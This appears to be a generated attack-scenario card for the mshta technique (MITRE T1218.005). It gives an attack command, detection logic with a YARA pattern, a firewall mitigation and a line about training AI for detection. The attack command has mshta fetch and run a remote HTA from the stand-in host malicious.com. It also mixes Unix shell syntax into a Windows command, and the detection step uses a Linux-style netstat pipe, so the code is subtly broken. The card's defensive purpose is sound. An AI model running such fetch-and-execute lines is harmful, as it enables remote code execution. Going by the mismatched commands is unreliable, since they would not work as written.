---
type: campaign
scenario_id: 42
tactic: Defense Evasion
technique: "T1218.005: Mshta"
technique_id: T1218.005
tags: [campaign, lotl, defense_evasion]
---

# Using mshta.exe to execute malicious HTA file from remote server.

## Threat Description
Using mshta.exe to execute malicious HTA file from remote server.

## Attack Command
```
mshta http://malicious.com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hta)
```

## Detection Logic
Monitor mshta network activity: `netstat -anp | grep mshta`; YARA rule: `rule MshtaRemote { strings: $a = /mshta.*http/ nocase; condition: $a }`

## Mitigation
Block mshta network access: `netsh advfirewall firewall add rule name='Block mshta' dir=out program='%windir%\System32\mshta.exe' action=block`; Disable HTA execution: AppLocker.

## AI Training Prompt
Train AI to detect mshta remote execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
